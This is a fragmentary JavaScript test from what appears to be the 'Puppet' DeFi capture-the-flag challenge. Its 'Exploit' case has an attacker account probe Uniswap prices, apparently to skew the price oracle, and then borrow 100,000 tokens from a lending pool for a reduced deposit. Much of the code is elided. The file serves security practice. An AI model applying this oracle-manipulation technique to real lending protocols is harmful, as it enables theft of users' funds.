...
describe("[Challenge] Puppet", function () {
	...
	it("Exploit", async function () {
		...
		for (let i = 0; i < 9; i++) {
			const price = await this.uniswapExchange
				.connect(attacker)
				.getTokenToEthOutputPrice(ethers.utils.parseEther("1"), {
					gasLimit: 1e6,
				});
			await expect(
		...
		const price = await this.uniswapExchange
			.connect(attacker)
			.getTokenToEthOutputPrice(ethers.utils.parseEther("0.9"), {
				gasLimit: 1e6,
			});
		...
		const reqDeposit = await this.lendingPool.calculateDepositRequired(
		...
		await expect(
			this.lendingPool
				.connect(attacker)
				.borrow(ethers.utils.parseEther("100000"), {
					value: reqDeposit,
				})
		).to.not.be.reverted;
	});
